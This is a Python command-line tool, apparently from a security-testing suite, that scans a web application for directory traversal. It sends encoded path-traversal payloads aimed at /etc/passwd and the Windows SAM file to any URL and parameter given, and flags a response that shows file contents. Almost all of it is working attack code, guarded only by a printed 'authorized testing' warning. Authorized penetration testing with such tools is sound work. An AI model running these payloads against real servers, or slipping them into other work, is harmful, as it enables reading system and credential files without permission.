#!/usr/bin/env python3
"""
Directory Traversal Attack Simulation

Tests web applications for directory traversal vulnerabilities by attempting to access files
outside the web root using path traversal techniques.

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os, sys, argparse
from typing import Dict, Any, List

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

logger = get_logger(__name__)

try:
    import requests
except ImportError:
    logger.error("Requires requests: pip install requests")
    sys.exit(1)


# Common directory traversal payloads
DEFAULT_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
]


class DirectoryTraversalAttack:
    """Directory traversal attack simulator."""

    def __init__(self, url: str, param: str, payloads: List[str], verbose: bool = False):
        self.url = url
        self.param = param
        self.payloads = payloads
        self.verbose = verbose
        self.attempts = 0
        self.found_vulnerabilities = []
        logger.info(f"Initialized directory traversal testing on {url}")

    def test_payload(self, payload: str) -> bool:
        """Test a single directory traversal payload."""
        try:
            params = {self.param: payload}
            response = requests.get(self.url, params=params, timeout=10)
            self.attempts += 1

            # Check for common file content indicators
            indicators = ["root:", "[users]", "<?php", "#!/bin/bash"]
            for indicator in indicators:
                if indicator in response.text:
                    logger.warning(f"Potential vulnerability found with payload: {payload}")
                    self.found_vulnerabilities.append(payload)
                    return True

            if self.verbose:
                logger.debug(f"Payload unsuccessful: {payload}")
            return False
        except Exception as e:
            if self.verbose:
                logger.debug(f"Error testing payload: {e}")
            return False

    def execute(self) -> Dict[str, Any]:
        """Execute the directory traversal testing."""
        logger.info(f"Starting directory traversal testing with {len(self.payloads)} payloads")

        try:
            for i, payload in enumerate(self.payloads, 1):
                logger.info(f"Testing payload {i}/{len(self.payloads)}")
                self.test_payload(payload)

            if self.found_vulnerabilities:
                logger.warning(f"Found {len(self.found_vulnerabilities)} potential vulnerabilities")
            else:
                logger.info("No vulnerabilities detected")

        except KeyboardInterrupt:
            logger.warning("Interrupted")
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            stats = {
                "attempts": self.attempts,
                "vulnerabilities_found": len(self.found_vulnerabilities),
                "payloads": self.found_vulnerabilities
            }
            return stats


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Directory Traversal Attack Simulation")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", required=True, help="Parameter to test")
    parser.add_argument("--payloads", help="Custom payloads file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    return parser.parse_args()


def main():
    print("=" * 80)
    print("WARNING: For AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 80)
    try:
        args = parse_arguments()

        if args.payloads:
            with open(args.payloads, 'r') as f:
                payloads = [line.strip() for line in f if line.strip()]
        else:
            payloads = DEFAULT_PAYLOADS

        attack = DirectoryTraversalAttack(args.url, args.param, payloads, args.verbose)
        attack.execute()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
